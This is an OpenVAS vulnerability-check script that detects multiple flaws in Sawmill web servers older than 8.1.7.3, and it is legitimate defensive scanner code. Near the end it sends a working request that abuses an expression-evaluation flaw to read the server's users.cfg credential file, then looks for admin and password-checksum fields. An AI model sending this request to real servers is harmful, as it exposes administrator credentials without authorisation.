###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sawmill_44292.nasl 14 2013-10-27 12:33:37Z jan $
#
# Sawmill Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Sawmill is prone to multiple security vulnerabilities, including unauthorized-
access, security-bypass, and cross-site-scripting issues.

Attackers can exploit these issues to gain administrative access to
the affected application, execute arbitrary commands, perform
unauthorized actions, and steal cookie-based authentication
credentials. Other attacks are also possible.

Versions prior to Sawmill 8.1.7.3 are vulnerable.";

tag_solution = "Updates are available. Please see the references for details.";

if (description)
{
 script_id(100866);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-10-22 14:10:21 +0200 (Fri, 22 Oct 2010)");
 script_bugtraq_id(44292);
 script_tag(name:"cvss_base", value:"9.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
 script_tag(name:"risk_factor", value:"Critical");
 script_name("Sawmill Multiple Security Vulnerabilities");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44292");
 script_xref(name : "URL" , value : "https://www.sec-consult.com/files/20101021-0_sawmill_multiple_critical_vulns.txt");
 script_xref(name : "URL" , value : "http://www.sawmill.net");
 script_xref(name : "URL" , value : "http://www.sawmill.net/version_history8.html");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/514405");

 script_description(desc);
 script_summary("Determine if sawmill is prone to multiple security vulnerabilities");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_sawmill_detect.nasl");
 script_require_ports("Services/www", 8988);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:8988);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port: port);
if(!banner)exit(0);
if("Server: Sawmill/" >!< banner)exit(0);

url = string("/?a=ee&exp=error(read_file(%27LogAnalysisInfo/users.cfg%27))");

if(http_vuln_check(port:port, url:url,pattern:"root_admin",extra_check:make_list("password_checksum","users","username"))) {
  security_hole(port:port);
  exit(0);
}  

exit(0);
